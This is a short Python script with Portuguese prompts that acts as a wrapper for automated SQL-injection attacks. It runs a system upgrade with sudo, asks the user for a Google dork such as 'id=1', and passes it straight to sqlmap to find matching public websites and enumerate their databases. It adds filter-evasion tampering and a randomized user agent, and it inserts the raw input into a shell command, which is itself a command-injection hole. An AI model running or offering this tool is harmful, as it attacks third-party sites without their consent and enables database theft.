import os

print('''
 __                    __           
(_  .  _   _  |  _  / |_   _   _    
__) | ||| |_) | (- /  |__ (_| _) \/ 
          |                      /  
                           __                            
|_     .   |   .  _  . |_ |__)  _  _  _  _  _  |_  _   _ 
|_) \/ .   |__ | ||| | |_ | \  (- (_ |  (- (_| |_ (_) |  
    /                                                    
''')

print("LEIA O QUE O TERMINAL TE DIZ ! ! !")
os.system('sudo apt update && sudo apt upgrade')
print('LEIA O QUE O TERMINAL TE DIZ ! ! !')
edu_quest = input('sabe o que é uma dork?(s/n): ')
if edu_quest == "n":
	print('Não vou te dar a explicação de bandeja, em prol do seu aprendizado, pesquise e estude por si para consolidar seus conhecimentos...')
	print('Porém para que possa usar esse script, basta que você tenha conhecimentos sobre sqlinjection')
	print('Então...Quando te perguntar a dork digite o parâmetro de injeção que possa conter falhas e deixar com que o sqlmap faça o resto (ex: dork: "id=1" | "id=312" ...')
gdork = input('Digite a dork que será usada como parâmetro: ')
os.system(f'sqlmap -g {gdork} --dbs --batch --random-agent --tamper=space2comment --level 4 --risk 2')
